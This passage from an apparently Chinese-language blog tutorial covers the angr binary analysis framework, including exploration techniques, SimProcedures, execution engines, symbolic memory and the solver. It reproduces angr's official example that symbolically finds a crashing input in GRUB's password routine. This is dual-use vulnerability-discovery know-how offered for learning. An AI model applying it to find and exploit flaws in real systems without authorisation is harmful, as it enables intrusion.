8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#exploration-techniques">https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#exploration-techniques</a></p></blockquote><p>​        探索技术也是angr 进行分析的核心功能，angr内建了很多探索技术，同时也允许分析人员自建探索技术。这主要用来帮助研究者自定义simulation manager的行为。在进行分析的过程中可能会遇到这种情况，对于某个state的某些部分，研究人员不想使用默认的 “step everything at once”策略，这种策略主要是利用了广度优先搜索的思想，但是有时候可能深度优先搜索更具效果，因此angr提供simgr.use_technique(tech)来让研究人员自定义探索行为。tech是一个ExplorationTechnique subclass，内建的探索技术在angr.exploration_techniques中，不过在自动化漏洞挖掘的经验中，很多情况下需要自建探索策略。这里给出一个脚本，是下面例子的一个官方解释，如果第一次接触angr，还不需要理解，只是为了提供一个demo让人更直观的体验这样的功能。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> angr<span class="token keyword">import</span> logging<span class="token comment"># This is the important logic that makes this problemt tractable</span><span class="token keyword">class</span> <span class="token class-name">CheckUniqueness</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>ExplorationTechnique<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>unique_states <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> simgr<span class="token punctuation">,</span> state<span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> reg <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span> <span class="token string">'ebx'</span><span class="token punctuation">,</span> <span class="token string">'ecx'</span><span class="token punctuation">,</span> <span class="token string">'edx'</span><span class="token punctuation">,</span> <span class="token string">'esi'</span><span class="token punctuation">,</span> <span class="token string">'edi'</span><span class="token punctuation">,</span> <span class="token string">'ebp'</span><span class="token punctuation">,</span> <span class="token string">'esp'</span><span class="token punctuation">,</span> <span class="token string">'eip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            val <span class="token operator">=</span> state<span class="token punctuation">.</span>registers<span class="token punctuation">.</span>load<span class="token punctuation">(</span>reg<span class="token punctuation">)</span>            <span class="token keyword">if</span> val<span class="token punctuation">.</span>symbolic<span class="token punctuation">:</span>                vals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'symbolic'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                vals<span class="token punctuation">.</span>append<span class="token punctuation">(</span>state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>        vals <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>vals<span class="token punctuation">)</span>        <span class="token keyword">if</span> vals <span class="token keyword">in</span> self<span class="token punctuation">.</span>unique_states<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not_unique'</span>        self<span class="token punctuation">.</span>unique_states<span class="token punctuation">.</span>add<span class="token punctuation">(</span>vals<span class="token punctuation">)</span>        <span class="token keyword">return</span> simgr<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> filter_func<span class="token operator">=</span>filter_func<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">SearchForNull</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>ExplorationTechnique<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> simgr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'found'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">:</span>            simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'found'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> simgr<span class="token punctuation">,</span> state<span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> state<span class="token punctuation">.</span>addr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'found'</span>        <span class="token keyword">return</span> simgr<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> filter_func<span class="token operator">=</span>filter_func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">complete</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> simgr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setup_project</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'/root/development/angr-doc/examples/grub/crypto.mod'</span><span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment"># use libc functions as stand-ins for grub functions</span>    memset <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'memset'</span><span class="token punctuation">]</span>    getchar <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>    do_nothing <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'stubs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ReturnUnconstrained'</span><span class="token punctuation">]</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'grub_memset'</span><span class="token punctuation">,</span> memset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'grub_getkey'</span><span class="token punctuation">,</span> getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># I don't know why, but grub_xputs is apparently not the function but a pointer to it?</span>    xputs_pointer_addr <span class="token operator">=</span> project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>find_symbol<span class="token punctuation">(</span><span class="token string">'grub_xputs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rebased_addr    xputs_func_addr <span class="token operator">=</span> project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>extern_object<span class="token punctuation">.</span>allocate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># project.hook(xputs_func_addr, do_nothing())</span>    project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>pack_word<span class="token punctuation">(</span>xputs_pointer_addr<span class="token punctuation">,</span> xputs_func_addr<span class="token punctuation">)</span>    <span class="token keyword">return</span> project<span class="token keyword">def</span> <span class="token function">find_bug</span><span class="token punctuation">(</span>project<span class="token punctuation">,</span> function<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># set up the most generic state that could enter this function</span>    func_addr <span class="token operator">=</span> project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>find_symbol<span class="token punctuation">(</span>function<span class="token punctuation">)</span><span class="token punctuation">.</span>rebased_addr    start_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>call_state<span class="token punctuation">(</span>func_addr<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span>    <span class="token comment"># start_state = project.factory.entry_state()</span>    <span class="token comment"># create a new simulation manager to explore the state space of this function</span>    simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>start_state<span class="token punctuation">)</span>    simgr<span class="token punctuation">.</span>use_technique<span class="token punctuation">(</span>SearchForNull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    simgr<span class="token punctuation">.</span>use_technique<span class="token punctuation">(</span>CheckUniqueness<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    simgr<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'we found a crashing input!'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'crashing state:'</span><span class="token punctuation">,</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> find_bug<span class="token punctuation">(</span>setup_project<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'grub_password_get'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>angr<span class="token punctuation">.</span>PointerWrapper<span class="token punctuation">(</span><span class="token string">b'\0'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\r'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'angr.sim_manager'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> setup_project<span class="token punctuation">(</span><span class="token punctuation">)</span>    find_bug<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">'grub_password_get'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>angr<span class="token punctuation">.</span>PointerWrapper<span class="token punctuation">(</span><span class="token string">'\0'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Programming-SimProcedures"><a href="#Programming-SimProcedures" class="headerlink" title="Programming SimProcedures"></a>Programming SimProcedures</h3><p>​        SimProcedures主要是用来定义程序行为，如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span> SimProcedure<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> project <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'examples/fauxware/fauxware'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">class</span> <span class="token class-name">BugFree</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Program running with argc=%s and argv=%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token comment"># this assumes we have symbols for the binary</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">,</span> BugFree<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Run a quick execution!</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># step until no more active states</span>Program running <span class="token keyword">with</span> argc<span class="token operator">=</span><span class="token operator">&lt;</span>SAO <span class="token operator">&lt;</span>BV64 <span class="token number">0x0</span><span class="token operator">&gt;&gt;</span> <span class="token keyword">and</span> argv<span class="token operator">=</span><span class="token operator">&lt;</span>SAO <span class="token operator">&lt;</span>BV64 <span class="token number">0x7fffffffffeffa0</span><span class="token operator">&gt;&gt;</span><span class="token operator">&lt;</span>SimulationManager <span class="token keyword">with</span> <span class="token number">1</span> deadended<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该例子展示了对于main函数的hook，导致main函数不再执行，而是执行BugFree，这项功能的一个重要作用就是替换库函数：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230130094438794.45v20way4sk0.png"></p><h3 id="Execution-Engines"><a href="#Execution-Engines" class="headerlink" title="Execution Engines"></a>Execution Engines</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://docs.angr.io/core-concepts/simulation">https://docs.angr.io/core-concepts/simulation</a></p></blockquote><p>​        对于二进制分析工作来说，必须要了解的就是执行引擎了，当二进制分析人员指定angr进行step执行等工作的时候，虽然是静态分析，但是也必须存在一些东西真的执行相关动作，执行引擎其实包含很多不同的引擎，一般来说会按照默认情况执行：</p><ul><li>The failure engine kicks in when the previous step took us to some uncontinuable state</li><li>The syscall engine kicks in when the previous step ended in a syscall</li><li>The hook engine kicks in when the current address is hooked</li><li>The unicorn engine kicks in when the <code>UNICORN</code> state option is enabled and there is no symbolic data in the state</li><li>The VEX engine kicks in as the final fallback.</li></ul><p>不过就日常使用，最关键的还是对SimSuccessors，breakpoints这些概念的理解，上面的这些引擎也是在<code>project.factory.successors(state, **kwargs)</code>的驱动下进行的，对于引擎的step, run等执行操作，也非常依赖successors，如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">step_state</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> state<span class="token punctuation">,</span> successor_func<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> error_list<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>run_args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Don't use this function manually - it is meant to interface with exploration techniques.    """</span>    error_list <span class="token operator">=</span> error_list <span class="token keyword">if</span> error_list <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> self<span class="token punctuation">.</span>_errored    <span class="token keyword">try</span><span class="token punctuation">:</span>        successors <span class="token operator">=</span> self<span class="token punctuation">.</span>successors<span class="token punctuation">(</span>state<span class="token punctuation">,</span> successor_func<span class="token operator">=</span>successor_func<span class="token punctuation">,</span> <span class="token operator">**</span>run_args<span class="token punctuation">)</span>        stashes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token boolean">None</span><span class="token punctuation">:</span> successors<span class="token punctuation">.</span>flat_successors<span class="token punctuation">,</span>                   <span class="token string">'unsat'</span><span class="token punctuation">:</span> successors<span class="token punctuation">.</span>unsat_successors<span class="token punctuation">,</span>                   <span class="token string">'unconstrained'</span><span class="token punctuation">:</span> successors<span class="token punctuation">.</span>unconstrained_successors<span class="token punctuation">}</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>SimUnsatError<span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>UnsatError<span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> LAZY_SOLVES <span class="token keyword">not</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>options<span class="token punctuation">:</span>            error_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ErrorRecord<span class="token punctuation">(</span>state<span class="token punctuation">,</span> e<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            stashes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            stashes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'pruned'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>state<span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_hierarchy<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_hierarchy<span class="token punctuation">.</span>unreachable_state<span class="token punctuation">(</span>state<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>_hierarchy<span class="token punctuation">.</span>simplify<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> claripy<span class="token punctuation">.</span>ClaripySolverInterruptError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        resource_event<span class="token punctuation">(</span>state<span class="token punctuation">,</span> e<span class="token punctuation">)</span>        stashes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'interrupted'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>state<span class="token punctuation">]</span><span class="token punctuation">}</span>    <span class="token keyword">except</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_resilience<span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>        error_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ErrorRecord<span class="token punctuation">(</span>state<span class="token punctuation">,</span> e<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        stashes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> stashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述的这些step操作返回的都是SimSuccessors object，它的核心作用在于给successor states打标签，其实就是对下一步的操作进行标记，然后分类存储。为了理解不同类型的successor states，你必须对符号约束有深刻的理解，官网讲的也挺详细的，我就不赘述了，初学者见到guard这个概念可能会懵，但是简单来说这其实就是用来标记Angr block之间的跳转关系的。</p><h3 id="Symbolic-memory-addressing"><a href="#Symbolic-memory-addressing" class="headerlink" title="Symbolic memory addressing"></a>Symbolic memory addressing</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/angr/angr-doc/blob/master/docs/concretization_strategies.md">https://github.com/angr/angr-doc/blob/master/docs/concretization_strategies.md</a></p></blockquote><p>​        为了了解符号执行，必须知道Symbolic memory addressing，angr支持Symbolic memory addressing，这意味着内存的offset可以被符号化，同时当进行一个写操作的时候会将符号地址具体化，当然符号化的过程也是可以通过策略配置的。在策略方面也是存在写策略和读策略state.memory.read_strategies，state.memory.write_strategies，这些策略会按顺序调用，直到某个策略可以将符号地址具体化，比较关键的一点在于：</p><p>​         By setting your own concretization strategies (or through the use of SimInspect <code>address_concretization</code> breakpoints, described above), you can change the way angr resolves symbolic addresses.</p><p>不过看文档，在进行读操作的时候也存在具体化策略。</p><h3 id="Solver-Engine"><a href="#Solver-Engine" class="headerlink" title="Solver Engine"></a>Solver Engine</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://docs.angr.io/core-concepts/solver">https://docs.angr.io/core-concepts/solver</a></p></blockquote><p>​        Angr的强大不仅在于它作为一个模拟器，更在于它强大的符号执行能力，这一能力的基础就来源于Solver Engine，angr的symbolic variables表示为一个符号，just a name，但是在用符号变量执行算术操作的时候会生成一个操作数，类似编译原理里面的AST，AST可以被转换为SMT solver的约束，经典的SMT solver就是z3。所以为了更好的使用angr，必须深刻了解Solver Engine。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># Create a bitvector symbol named "x" of length 64 bits</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> state.solver.BVS<span class="token punctuation">(</span><span class="token string">"x"</span>, <span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token 